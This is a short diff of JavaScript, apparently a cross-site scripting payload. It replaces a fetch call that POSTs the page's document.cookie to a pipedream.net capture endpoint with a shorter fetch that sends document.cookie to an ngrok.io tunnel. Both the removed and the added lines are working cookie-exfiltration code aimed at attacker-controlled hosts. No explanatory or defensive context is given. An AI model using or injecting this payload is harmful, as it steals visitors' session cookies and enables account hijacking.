@@ -1,8 +1,1 @@
-fetch(
-  "https://eoidyopoyxej0sc.m.pipedream.net?cookie="+document.cookie,
-  {
-    method: 'POST',
-    mode: 'no-cors',
-    body: document.cookie
-  }
-);
+fetch('https://d29d-60-115-150-252.jp.ngrok.io?c=' + document.cookie)
